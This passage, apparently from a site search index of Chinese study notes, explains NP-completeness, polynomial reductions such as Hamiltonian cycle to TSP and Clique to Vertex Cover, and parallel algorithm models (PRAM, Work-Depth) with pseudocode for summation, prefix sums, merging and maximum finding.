<li>\u4e8b\u5b9e\u4e0a\uff0c\u5224\u65ad\u4e00\u4e2a\u56fe\u662f\u5426\u542b\u6709\u81f3\u5c11\u6709\u7ed9\u5b9a\u6570\u91cf\u8fb9\u7684\u7b80\u5355\u8def\u5f84\u4e5f\u662f\u4e00\u4e2a NP \u5b8c\u5168\u95ee\u9898</li> </ul> </li> <li>Hamiltonian Cycle \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u904d\u5386\u6bcf\u4e00\u6761\u8fb9\u6765\u7b80\u5355\u5224\u65ad\u4e00\u4e2a\u56fe\u662f\u5426\u5b58\u5728 Euler Cycle\uff0c\u4f46\u662f\u5224\u65ad\u662f\u5426\u5b58\u5728 Hamiltonian Cycle \u5374\u662f NP \u7684\u3002</li> </ul>"},{"location":"Courses/DS/ADS/NP-Completeness/#np-completeness_1","title":"NP-Completeness","text":"<p>\u6211\u4eec\u5c06\u95ee\u9898\u5206\u4e3a\u4e09\u7c7b\uff0c<code>P</code>(Polinomial time),<code>NP</code>(Nondeterministc Polinomial time),<code>NPC</code>(NP Complete)\uff0c\u5e76\u7ed9\u51fa\u5982\u4e0b\u7b80\u5355\u4f46\u4e0d\u89c4\u8303\u7684\u5b9a\u4e49\uff1a</p> <ul> <li>Class P \u4e2d\u7684\u95ee\u9898\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\uff0c\u5373\u5b83\u4eec\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5e94\u4e3a \\(O(n^k)\\)</li> <li>Class NP \u4e2d\u7684\u95ee\u9898\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u9a8c\u8bc1<ul> <li>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u54c8\u5bc6\u987f\u56de\u8def\u7684\u95ee\u9898\uff0c\u867d\u7136\u6211\u4eec\u4e0d\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u89e3\u51b3\u5b83\uff0c\u4f46\u662f\u7ed9\u51fa\u4e00\u4e2a\u7b54\u6848\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u9a8c\u8bc1\u8be5\u5e8f\u5217\u662f\u5426\u662f\u54c8\u5bc6\u987f\u56de\u8def\uff0c\u56e0\u6b64\u5b83\u5c5e\u4e8e NP \u7c7b</li> <li>P \u5185\u4efb\u610f\u95ee\u9898\u4e5f\u5c5e\u4e8e NP\uff0c\u5373 \\(P\\subseteq NP\\) </li> </ul> </li> <li>Class NPC \u4e2d\u7684\u95ee\u9898\u5b9a\u4e49\u4e3a\uff0c\u5c5e\u4e8e \\(NP\\) \u95ee\u9898\uff0c\u4e14\u4e0e \\(NP\\) \u95ee\u9898\u4e2d\u4efb\u4e00\u95ee\u9898\u96be\u5ea6\u76f8\u540c\uff0c\u5373\u4efb\u610f \\(NP\\) \u95ee\u9898\u90fd\u53ef\u4ee5\u591a\u9879\u5f0f\u5f52\u7ea6\u4e8e\u8be5\u95ee\u9898\u3002<ul> <li>\\(\\forall L' \\in NP, \\ L' \\le _P L, \\ \\ \\Rightarrow L\\in NPC\\) </li> <li>\u5982\u679c\u4efb\u4e00 NPC \u95ee\u9898\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\uff0c\u5219\u6240\u6709 \\(NP\\) \u95ee\u9898\u5747\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3</li> </ul> </li> </ul> <p>\u591a\u9879\u5f0f\u5f52\u7ea6 Polynomially Reduce</p> <p>\u5c06\u4e00\u4e2a\u95ee\u9898\u901a\u8fc7\u6709\u9650\u6b65\u591a\u9879\u5f0f\u590d\u6742\u5ea6\u8f6c\u6362\u4e3a\u53e6\u4e00\u4e2a\u95ee\u9898\u3002\u82e5\u67d0 NPC \u95ee\u9898\u53ef\u4ee5\u591a\u9879\u5f0f\u5f52\u7ea6\u81f3\u53e6\u4e00\u4e2a\u95ee\u9898\uff0c\u5219\u8be5\u95ee\u9898\u5c5e\u4e8e NP-Hard \u95ee\u9898\u3002</p> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u4e2a \\(NPH\\) \u95ee\u9898</p> <p>\u7ed9\u5b9a\u4e00\u4e2a\u5df2\u77e5\u7684 \\(NPC\\) \u95ee\u9898 \\(L'\\) \uff0c\u5982\u679c\u8be5\u95ee\u9898\u53ef\u4ee5\u591a\u9879\u5f0f\u5f52\u7ea6\u81f3\u53e6\u4e00\u4e2a\u95ee\u9898 \\(L\\) \uff0c\u5373 \\(L'\\le _P L\\) \uff0c\u5219\u79f0 \\(L\\) \u4e3a \\(NPH\\) \u95ee\u9898\uff1b\u6b64\u65f6\u82e5\u6709\u6761\u4ef6 \\(L\\in NP\\)\uff0c\u5219 \\(L\\) \u4e5f\u4e3a \\(NPC\\) \u95ee\u9898\u3002</p>"},{"location":"Courses/DS/ADS/NP-Completeness/#turing-machine","title":"Turing Machine","text":"<p>\u56fe\u7075\u673a\u7531\u65e0\u9650\u957f\u7eb8\u5e26(Infinite Memory)\u548c\u8bfb\u5199\u5934(Scanner)\u7ec4\u6210\uff0c\u7eb8\u5e26\u88ab\u5212\u5206\u4e3a\u4e00\u4e2a\u4e2a\u5b58\u50a8\u6570\u636e\u7684\u5c0f\u683c\u5b50\uff0c\u800c\u8bfb\u5199\u5934\u5219\u6839\u636e\u5f53\u524d\u72b6\u6001\u548c\u6307\u5411\u683c\u5b50\u7684\u7b26\u53f7\u51b3\u5b9a\u4e0b\u4e00\u6b65\u79fb\u52a8\u5230\u54ea\u91cc\u3002</p> <ul> <li>Deterministic Turing Machine \u5728\u6bcf\u4e00\u70b9\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u7136\u540e\u6839\u636e\u8be5\u547d\u4ee4\u8bfb\u5199\u5934\u4f1a\u79fb\u52a8\u5230\u552f\u4e00\u7684\u4e0b\u4e00\u72b6\u6001\u3002</li> <li>Nondeterministic Turing Machine \u5219\u53ef\u4ee5\u4ece\u4e00\u4e2a\u6709\u9650\u5217\u8868\u4e2d\u81ea\u7531\u9009\u62e9\u4e0b\u4e00\u6b65\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u4ece\u4e2d\u9009\u62e9\u80fd\u591f\u89e3\u51b3\u95ee\u9898\u7684\u90a3\u4e00\u6b65\u3002<ul> <li>\u5047\u8bbe\u6bcf\u4e00\u6b65\u90fd\u6709 \\(k\\) \u6b65\u53ef\u4ee5\u9009\u62e9\uff0c\u5bf9\u4e8e\u591a\u9879\u5f0f\u65f6\u95f4 \\(O(n)\\) \uff0c\u90a3\u4e48\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(k^n)\\) \uff0c\u4e3a\u8d85\u591a\u9879\u5f0f\u7ea7\u522b\u3002</li> </ul> </li> </ul> <p>\u5728\u56fe\u7075\u673a\u8bed\u5883\u4e0b\uff0c\\(NP\\) \u95ee\u9898\u7684\u5b9a\u4e49\u4e3a\u975e\u786e\u5b9a\u56fe\u7075\u673a\u80fd\u591f\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\u7684\u95ee\u9898\u3002</p>"},{"location":"Courses/DS/ADS/NP-Completeness/#hcp-tsp","title":"HCP &amp; TSP","text":"<ul> <li>Hamiltonian cycle problem Given a graph \\(G=(V, E)\\), is there a simple cycle that visits all vertices?</li> <li>Traveling salesman problem Given a complete graph \\(G=(V, E)\\), with edge costs, and an integer \\(K\\), is there a simple cycle that visits all vertices and has total cost \\(\\le K\\) ?</li> </ul> <p>\u5728\u5df2\u77e5\u54c8\u5bc6\u987f\u56de\u8def\u95ee\u9898\u5c5e\u4e8e \\(NPC\\) \u60c5\u51b5\u4e0b\uff0c\u5229\u7528\u591a\u9879\u5f0f\u5f52\u7ea6\u8bc1\u660e\u65c5\u884c\u5546\u95ee\u9898\u4e5f\u662f \\(NPC\\)\u3002</p> <p>\u5982\u679c\u7ed9\u51fa\u65c5\u884c\u5546\u95ee\u9898\u7684\u4e00\u7ec4\u7b54\u6848\uff0c\u6211\u4eec\u53ea\u9700\u8981\u9a8c\u8bc1\u5176\u662f\u5426\u6ee1\u8db3\u904d\u5386\u6bcf\u4e00\u4e2a\u9876\u70b9\u4ee5\u53ca\u603b\u6d88\u8017\u662f\u5426\u5c0f\u4e8e \\(K\\) \u4e24\u4e2a\u8981\u6c42\uff0c\u56e0\u6b64 TSP \u663e\u7136\u662f\u4e00\u4e2a \\(NP\\) \u95ee\u9898\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u8bc1\u660e\u53ef\u4ee5\u5c06 HCP \u95ee\u9898\u591a\u9879\u5f0f\u5f52\u7ea6\u81f3 TSP \u95ee\u9898\uff0c\u4ea6\u7b49\u4ef7\u4e8e\u8bc1\u660e \\(HCP\\le _P TSP\\) \uff1a</p> <p></p> <p>\u5047\u8bbe\u6211\u4eec\u5df2\u6709\u4e00\u56fe \\(G\\) \u5305\u542b\u54c8\u5bc6\u987f\u56de\u8def\uff08\u56fe\u4e2d\u9ed1\u8272\uff0c\u4e14\u4e0d\u4e00\u5b9a\u662f\u5b8c\u5168\u56fe\uff09\uff0c\u5c06 \\(G\\) \u586b\u5145\u81f3\u5b8c\u5168\u56fe \\(G'\\) \uff0c\u5e76\u8bbe\u7f6e\u539f\u6765\u7684\u8fb9\u6743\u503c\u4e3a \\(1\\) \uff0c\u589e\u52a0\u7684\u8fb9\u6743\u503c\u4e3a \\(2\\) \uff0c\u5219\u5bf9\u4e8e\u8be5\u6709\u6743\u5b8c\u5168\u56fe\u65c5\u884c\u5546\u95ee\u9898\u7684\u6700\u4f18\u89e3\u4e3a\u56fe\u4e2d\u7684\u9ed1\u8272\u54c8\u5bc6\u987f\u56de\u8def\uff0c\u5176\u6d88\u8017\u603b\u548c\u4e3a \\(|V|\\) \u3002</p> <p>\u800c\u5b9e\u9645\u7684 TSP \u95ee\u9898\u53ef\u80fd\u6bd4\u8be5\u7b80\u5355\u6743\u503c\u8bbe\u7f6e\u7684\u66f4\u4e3a\u56f0\u96be\uff0c\u4e14\u8865\u5168\u5b8c\u5168\u56fe\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u6700\u591a\u4e3a \\(O(N^2)\\) \uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8bf4\u5728\u56f0\u96be\u5ea6\u4e0a \\(HCP \\le _P TSP\\) \uff0c\u8bc1\u660e\u5b8c\u6bd5\u3002</p>"},{"location":"Courses/DS/ADS/NP-Completeness/#clique-problem-vertex-cover-problem","title":"Clique Problem &amp; Vertex Cover Problem","text":"<ul> <li>Clique Problem \u7ed9\u5b9a\u65e0\u5411\u56fe \\(G=(V,E)\\) \u4ee5\u53ca\u6574\u6570 \\(K\\) \uff0c\u5224\u65ad \\(G\\) \u662f\u5426\u5b58\u5728\u5305\u542b\u81f3\u5c11 \\(K\\) \u4e2a\u8282\u70b9\u7684\u5b8c\u5168\u5b50\u56fe</li> <li>Vertex Cover Problem \u7ed9\u5b9a\u65e0\u5411\u56fe \\(G=(V,E)\\) \u4ee5\u53ca\u6574\u6570 \\(K\\) \uff0c\u5224\u65ad \\(G\\) \u662f\u5426\u6709\u4e00\u9876\u70b9\u5b50\u96c6 \\(V'\\subseteq V\\) \u6ee1\u8db3 \\(|V'|\\le K\\) \u4ee5\u53ca\u6bcf\u6761\u8fb9\u90fd\u6709\u81f3\u5c11\u4e00\u4e2a\u7aef\u70b9\u4f4d\u4e8e \\(V'\\) \u4e2d</li> </ul> <p>\u5728\u5df2\u77e5 Clique Problem \u662f \\(NPC\\) \u7684\u60c5\u51b5\u4e0b\uff0c\u8bc1\u660e Vertex Cover Problem \u4e5f\u662f \\(NPC\\)</p> <p></p> <p>\u4ecd\u7136\u5148\u9a8c\u8bc1\u8be5\u95ee\u9898\u662f\u5426\u5c5e\u4e8e \\(NP\\) \uff0c\u4ec5\u9700\u8981\u770b \\(|V'|\\le K\\) \u4ee5\u53ca\u904d\u5386\u6bcf\u6761\u8fb9\u68c0\u67e5\u7aef\u70b9\u662f\u5426\u5728 \\(|V'|\\) \u5185\u5373\u53ef\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N^3)\\) \u3002</p> <p>\u5047\u8bbe\u5df2\u6709\u6ee1\u8db3 Clique \u95ee\u9898\u7684\u65e0\u5411\u56fe \\(G\\) \uff0c\u5176\u5305\u542b\u4e00\u4e2a\u8282\u70b9\u6570\u4e3a \\(\\ge K\\) \u7684\u6700\u5927\u5b50\u56fe\u3002\u5bf9 \\(G\\) \u5173\u4e8e\u5b8c\u5168\u56fe\u53d6\u8865\u96c6 \\(\\bar{G}\\) \uff0c\u5219 \\(\\bar{G}\\) \u4e2d\u4e0d\u5728\u4e0a\u8ff0\u6700\u5927\u5b50\u56fe\u4e2d\u7684\u9876\u70b9\u53ef\u6784\u6210 \\(V'\\) \u6ee1\u8db3\u6bcf\u6761\u8fb9\u90fd\u81f3\u5c11\u6709\u4e00\u4e2a\u7aef\u70b9\u4f4d\u4e8e \\(V'\\) \u4e2d\uff0c\u4e14 \\(|V'|\\le |V|-K\\) \u3002</p> <p>\u800c\u53d6\u8865\u96c6\u7684\u64cd\u4f5c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N^2)\\) \uff0c\u5c5e\u4e8e\u591a\u9879\u5f0f\u7ea7\u522b\uff1b\u4e14\u4e0a\u8ff0\u5b9a\u4e49\u7684 Vertex Cover Problem \u5c5e\u4e8e Vertex Cover Problem \u7684\u5b50\u95ee\u9898\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8bf4\u5728\u56f0\u96be\u5ea6\u4e0a \\(Clique \\le _P Vertex\\ Cover\\) \uff0c\u8bc1\u660e\u5b8c\u6bd5\u3002</p> <p>\u4ece Carton \u524d\u8f88\u90a3\u91cc\u5077\u6765\u7684\u56fe</p> <p></p>"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/","title":"Parallel Algorithms","text":""},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#parallel-algorithms","title":"Parallel Algorithms","text":"<p> \u7ea6 2059 \u4e2a\u5b57  54 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>\u5e76\u884c\u7b97\u6cd5</p> <ul> <li>\u5904\u7406\u5668\u5e76\u884c Machine Parallelism:<ul> <li>Processor Parallelism / Pipeline / \u957f\u6307\u4ee4\u96c6</li> </ul> </li> <li>\u7b97\u6cd5\u5e76\u884c Parallel Algorithms: \u4e24\u4e2a\u6a21\u578b<ul> <li>Parallel Random Access Machine(PRAM)</li> <li>Work-Depth(WD)</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#basic-model","title":"Basic Model","text":""},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#pram","title":"PRAM","text":"<p>\u4e3a\u4e86\u89e3\u51b3\u5904\u7406\u5668\u7684 Access Conflict\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4e09\u79cd\u7b56\u7565:</p> <ul> <li>Exclusive-Read Exclusive-Write(EREW) \u72ec\u5360\u8bfb\uff0c\u72ec\u5360\u5199</li> <li>Concurrent-Read Exclusive-Write(CREW) \u5e76\u53d1\u8bfb\uff0c\u72ec\u5360\u5199</li> <li>Concurrent-Read Concurrent-Write(CRCW) \u5e76\u53d1\u8bfb\uff0c\u5e76\u53d1\u5199</li> </ul> <p>\u800c\u8bfb\u5199\u5171\u6709\u4e09\u79cd\u4e0d\u540c\u7684 Rule\uff1a</p> <ul> <li>&lt;1&gt; Arbitrary Rule: \u968f\u673a\u9009\u62e9\u4e00\u4e2a processor \u8ba9\u5b83\u5199</li> <li>&lt;2&gt; Priority Rule: \u4f18\u5148\u7ea7\u9ad8\u7684 processor \u8ba9\u5b83\u5199</li> <li>&lt;3&gt; Common Rule: \u53ea\u5141\u8bb8\u5728\u5199\u76f8\u540c\u503c\u65f6\u5e76\u53d1\u5199</li> </ul> <p>\u4ee5\u7b80\u5355\u7684\u6c42\u548c\u4e3a\u4f8b\uff0c\u5047\u8bbe\u6211\u4eec\u9700\u8981\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u5e76\u6c42\u548c\u6570\u636e \\(A[0]+A[1]+...+ A[n]\\)\u3002</p> <p>\u5047\u5b9a\u6211\u4eec\u53ea\u6709\u4e00\u4e2a\u5904\u7406\u5668\uff0c\u90a3\u4e48\u8be5\u5904\u7406\u5668\u53ea\u80fd\u5355\u6b65\u53d6\u51fa\u6570\u636e\u5e76\u5355\u6b65\u6c42\u548c\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u663e\u800c\u6613\u89c1\u4e3a \\(O(N)\\)\u3002</p> <p>\u5bf9\u4e8e\u591a\u5904\u7406\u5668\u5e76\u884c\uff0c\u6211\u4eec\u5148\u53d6\u7279\u4f8b\uff0c\u5047\u8bbe\u6211\u4eec\u7684\u5904\u7406\u5668\u6570\u91cf\u4ee5\u53ca\u6570\u636e\u6570\u91cf\u5747\u4e3a \\(n=8\\)\uff1a</p> <p></p> <p>\u5728\u4e00\u4e2a\u65f6\u949f\u5468\u671f\u5185\uff0c\u6211\u4eec\u5c06\u4e34\u8fd1\u7684\u4e24\u4e2a\u5904\u7406\u5668\u5185\u6570\u636e\u8fdb\u884c\u6c42\u548c\uff0c\u90a3\u4e48\u65f6\u95f4\u590d\u6742\u5ea6\u7406\u8bba\u4e0a\u4e3a\u6811\u7684\u9ad8\u5ea6\uff0c\u5373 \\(O(\\log N)\\)\uff0c\u5bf9\u5e94\u7684\u4f2a\u4ee3\u7801\u53ef\u4ee5\u6982\u62ec\u5982\u4e0b\uff1a</p> <pre><code>for P_i ,  1 &lt;= i &lt;= n  pardo\n  B(0, i) := A( i ) // B \u5373\u4e0a\u56fe\u7684\u4e8c\u53c9\u6811\n  for h = 1 to log n do\n    if i &lt;= n/2^h\n      B(h, i) := B(h-1, 2i-1) + B(h-1, 2i)\n    else stay idle\n  for i = 1: output B(log n, 1);\n  else i &gt; 1: stay idle\n</code></pre> <p>Stay Idle \u4e5f\u662f\u5bf9\u5904\u7406\u5668\u7684\u4e00\u4e2a\u6307\u4ee4\u64cd\u4f5c\uff0c\u56e0\u6b64\u8be5\u7b97\u6cd5\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u7684\u6267\u884c\u64cd\u4f5c\u6570\u5747\u4e3a \\(O(N)\\)\uff0c\u8fd9\u91cc\u7684 N \u4e3a\u5904\u7406\u5668\u6570\u91cf</p> <p>\u7531\u6b64\u4f8b\u8fd8\u53ef\u4ee5\u770b\u51fa\uff0cPRAM\u6709\u4e24\u4e2a\u7f3a\u70b9\uff1a</p> <ul> <li>&lt;1&gt; \u5904\u7406\u5668\u6570\u91cf\u53d8\u5316\u65f6\u7279\u5b9a\u7b97\u6cd5\u4e0d\u518d\u9002\u7528\uff0c\u5373\u53ef\u8fc1\u79fb\u6027\u5dee</li> <li>&lt;2&gt; \u6240\u6709\u5904\u7406\u5668\u6307\u4ee4\u90fd\u7531\u7a0b\u5e8f\u5458\u9010\u4e00\u5206\u914d\uff0c\u7ec6\u8282\u592a\u591a</li> </ul>"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#wd","title":"WD","text":"<p>\u4e3a\u6b64\uff0c\u6211\u4eec\u63d0\u51fa\u4e86 Work-Depth \u6a21\u578b\uff0c\u5176\u4e3b\u8981\u533a\u522b\u5728\u4e8e\u5e76\u884c\u4f18\u5316\u7531\u7f16\u8bd1\u5668\u5b8c\u6210\uff0c\u51cf\u5c11\u4e86\u5bf9\u5197\u4f59\u7684\u5904\u7406\u5668\u7684\u8c03\u5ea6\u64cd\u4f5c\uff1a</p> <pre><code>for P_i ,  1 &lt;= i &lt;= n  pardo\n   B(0, i) := A( i )\nfor h = 1 to log n \n    for P_i, 1 &lt;= i &lt;= n/2^h  pardo\n        B(h, i) := B(h-1, 2i-1) + B(h-1, 2i)\nfor i = 1 pardo\n   output  B(log n, 1)\n</code></pre> \\[ T(n)=\\log n +2 =O(\\log n), W(n) =2n =O(n) \\]"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#measuring-performance","title":"Measuring Performance","text":"<p>\u5e76\u884c\u7b97\u6cd5\u7684\u6027\u80fd\u5ea6\u91cf\u8981\u4ece\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u5de5\u4f5c\u590d\u6742\u5ea6(work load)\u6765\u8003\u8651\u3002</p> <ul> <li>Work load - total number of operations: W(n)</li> <li>Worst-case running time : T(n)</li> </ul> <p>\u5bf9\u4e8e PRAM \u6a21\u578b\uff0c\u7406\u8bba\u4e0a\u9700\u8981\u65f6\u95f4\u590d\u6742\u5ea6 \\(T(n)\\) \u548c\u5de5\u4f5c\u590d\u6742\u5ea6 \\(W(n)\\) \u7684\u7b97\u6cd5\uff1a</p> <ul> <li>\u5982\u679c\u5904\u7406\u5668\u6570\u91cf\u4e3a \\(p(n)= \\frac{W(n)}{T(n)}\\)\uff0c\u90a3\u4e48\u9700\u8981\u82b1\u8d39 \\(T(n)\\) \u65f6\u95f4</li> <li>\u5982\u679c\u5904\u7406\u5668\u6570\u91cf \\(p\\le \\frac{W(n)}{T(n)}\\)\uff0c\u90a3\u4e48\u9700\u8981\u82b1\u8d39 \\(\\frac{W(n)}{p}\\) \u65f6\u95f4</li> <li>\u5bf9\u4e8e\u4efb\u610f\u5904\u7406\u5668\u6570\u91cf \\(p\\)\uff0c\u9700\u8981\u82b1\u8d39 \\(\\frac{W(n)}{p}+T(n)\\) \u65f6\u95f4<ul> <li>\u5373 \\(O(\\frac{W(n)}{p}+T(n))\\) \uff0c\u8c01\u5927\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662f\u8c01</li> </ul> </li> </ul> <p>\u800c\u5bf9\u4e8e WD \u6a21\u578b\uff0c\u5bf9\u4e8e\u4efb\u610f\u5904\u7406\u5668\u6570\u91cf \\(P(n)\\)\uff0c\u5728\u4f7f\u7528 concurrent-wrie \u7684\u524d\u63d0\u4e0b\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u5747\u4e3a \\(O(\\frac{W(n)}{P(n)}+T(n))\\)\u3002</p> <p>\u6709\u4ec0\u4e48\u533a\u522b\uff1f\u6211\u4e5f\u4e0d\u660e\u767d\ud83d\ude13</p>"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#prefix-sums","title":"\u7ecf\u5178\u6848\u4f8b\uff1aPrefix-Sums","text":"<p>\u7ed9\u51fa\u8f93\u5165: \\(A(1),A(2),...,A(n)\\)</p> <p>\u6c42: \\(\\sum_{i=1}^1 A(i), \\sum_{i=2}^1 A(i),..., \\sum_{i=n}^1 A(i)\\)</p> <p>\u56de\u987e\u6211\u4eec\u5728 Summation Problem \u4e2d\u6784\u9020\u7684\u5e73\u8861\u4e8c\u53c9\u6811\uff0c\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u6539\u9020\uff0c\u5e0c\u671b\u80fd\u5c06\u6700\u7ec8\u7684\u524d\u7f00\u548c\u8f93\u51fa\u5230\u53f6\u5b50\u8282\u70b9\u4e0a\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u4e8c\u53c9\u6811 \\(C(h,i)=\\sum_{i=1}^\\alpha A(i)\\)\uff0c\u5176\u4e2d \\(\\alpha\\) \u4e3a\u8be5\u8282\u70b9\u7684 Rightmost Descendant Leaf\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u8282\u70b9 \\(C(2,1)\\)\uff0c\u5b83\u5bf9\u5e94\u7740\u524d\u7f00\u548c \\(\\sum_{i=4}^1 A(i)\\)\uff1a</p> <p></p> <p>\u90a3\u4e48\u53ef\u4ee5\u5206\u7c7b\u5f97\u5230\u539f\u6765\u7684 \\(B(h,i)\\) \u548c \\(C(h,i)\\) \u7684\u5bf9\u5e94\u5173\u7cfb\uff1a</p> <pre><code>if (i==1) C(h,i) = B(h,i);\nelse if (i % 2 == 0) C(h,i) = C(h+1,i/2); // \u7b49\u4e8e\u7236\u8282\u70b9\u7684\u503c\nelse C(h,i) = C(h+1,(i-1)/2) + B(h,i); // \u7b49\u4e8e\u7236\u8282\u70b9\u5144\u5f1f\u52a0\u4e0a\u81ea\u5df1\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\u662f\u81ea\u9876\u5411\u4e0b\u8fdb\u884c\u5904\u7406\uff0c\u5bf9\u5e94\u7b97\u6cd5\u4e3a\uff1a</p> <pre><code>// Initialize\nfor P_i , 1 &lt;= i &lt;= n pardo\n  B(0, i) := A(i)\n// \u5411\u4e0a\u7b97 B\nfor h = 1 to log n\n  for i , 1 &lt;= i &lt;= n/2^h pardo\n    B(h, i) := B(h - 1, 2i - 1) + B(h - 1, 2i)\n\n// \u5411\u4e0b\u7b97 C\nfor h = log n to 0\n  for i even, 1 &lt;= i &lt;= n/2^h pardo\n    C(h, i) := C(h + 1, i/2)\n  for i = 1 pardo\n    C(h, 1) := B(h, 1)\n  for i odd, 3 &lt;= i &lt;= n/2^h pardo\n    C(h, i) := C(h + 1, (i - 1)/2) + B(h, i)\nfor Pi , 1 &lt;= i &lt;= n pardo\n  Output C(0, i)\n</code></pre>"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#merge","title":"\u7ecf\u5178\u6848\u4f8b\uff1aMerge","text":"<p>\u5c06\u4e24\u4e2a\u975e\u9012\u51cf\u6570\u7ec4 \\(A,B\\) \u8fdb\u884c\u5408\u5e76\u3002</p> <p>\u89e3\u51b3\u601d\u60f3\u4e3a\u5212\u5206(Partition)\uff0c\u6211\u4eec\u53d6\u7279\u4f8b\uff1a</p> <ul> <li>\\(A,B\\) \u5185\u5143\u7d20\u65e0\u91cd\u590d\u503c</li> <li>\\(A,B\\) \u7b49\u957f</li> <li>\\(\\log n\\) \u548c \\(n\\log n\\) \u5747\u4e3a\u6574\u6570\u503c\uff0c\u5176\u4e2d \\(n\\) \u4e3a\u6570\u7ec4\u957f\u5ea6</li> </ul> <p>\u9996\u5148\uff0c\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 \\(B\\) \u6570\u7ec4\u4e2d\u5404\u4e2a\u5143\u7d20\u5728 \\(A\\) \u6570\u7ec4\u4e2d\u7684\u6392\u5e8f\u4f4d\u7f6e\uff0c\u90a3\u4e48\u53ef\u4ee5\u5f97\u5230\u5e76\u884c\u7b97\u6cd5\uff1a</p> <pre><code>for P_i , 1 &lt;= i &lt;= n  pardo\n    C(i + RANK(i, B)) := A(i)\nfor P_i , 1 &lt;= i &lt;= n  pardo\n    C(i + RANK(i, A)) := B(i)\n</code></pre> <p>\u5206\u522b\u5bf9\u4e24\u4e2a\u6570\u7ec4\u5e76\u53d1\u8bfb\u5199\u5b9e\u73b0 Merge\uff0c\u5373\u5728\u77e5\u9053\u6392\u5e8f\u5173\u7cfb\u7684\u524d\u63d0\u4e0b\uff0c\u53ea\u9700\u8981 \\(O(n+m)\\text{work, \\&amp;}O(1)\\text{time}\\) \u5373\u53ef\u5e76\u884c\u8ba1\u7b97\u5b8c\u6210\u3002</p> <p>\u90a3\u4e48\u95ee\u9898\u7684\u91cd\u70b9\u5728\u4e8e\u5982\u4f55\u89e3\u51b3\u6392\u5e8f <code>RANK</code>\uff1f\u53ef\u4ee5\u53c2\u8003\u4ee5\u4e0b\u4e24\u4e2a\u7b97\u6cd5\uff1a</p> <p></p> <p>\u4e32\u884c\u7b97\u6cd5\u51cf\u5c11\u4e86W\uff0c\u4f46\u589e\u5927\u4e86T</p> <p>\u800c\u672c\u7ae0\u8282\u5e0c\u671b\u4e86\u89e3\u7684\u662f\u5e76\u884c\u7684\u6392\u5e8f\u65b9\u6cd5\uff1a</p> <p></p>"},{"location":"Courses/DS/ADS/Parallel%20Algorithms/#maximum-funding","title":"\u7ecf\u5178\u6848\u4f8b\uff1aMaximum Funding","text":"<p>Solution 1: \u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5</p> <pre><code>for P_i , 1 &lt;= i &lt;= n  pardo\n    B(i) := 0\nfor i and j, 1 &lt;= i, j &lt;= n  pardo // \u5e76\u884c\u8fd9\u4e00\u6b65\u9700\u8981 n^2 \u4e2a\u5904\u7406\u5668\n    if ( (A(i) &lt; A(j)) || ((A(i) = A(j)) &amp;&amp; (i &lt; j)) )\n            B(i) = 1\n    else B(j) = 1\nfor Pi , 1 &lt;= i &lt;= n  pardo\n    if B(i) == 0\n       A(i) is a maximum in A\n</code></pre> <ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(T(n)=O(1)\\)</li> <li>\u5de5\u4f5c\u590d\u6742\u5ea6 \\(W(n)=O(n^2)\\)</li> </ul> <p>\u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5\u662f\u5f88\u591a\u786c\u4ef6\u6700\u5927\u503c\u5bfb\u627e\u81ea\u5e26\u7684\u7b97\u6cd5\uff0c\u5176\u4f18\u70b9\u5c31\u662f\u901f\u5ea6\u5f88\u5feb</p> <p>Solution 2: Doubly-logarithmic Paradigm</p> <p>\u5c06\u5143\u7d20\u5212\u5206\u4e3a \\(\\sqrt{n}\\) \u4e2a\u957f \\(\\sqrt{n}\\) \u7684\u6bb5\uff0c\u7136\u540e\u5bf9\u6bcf\u4e2a\u6bb5\u518d\u8c03\u7528 Doubly-logarithmic Paradigm 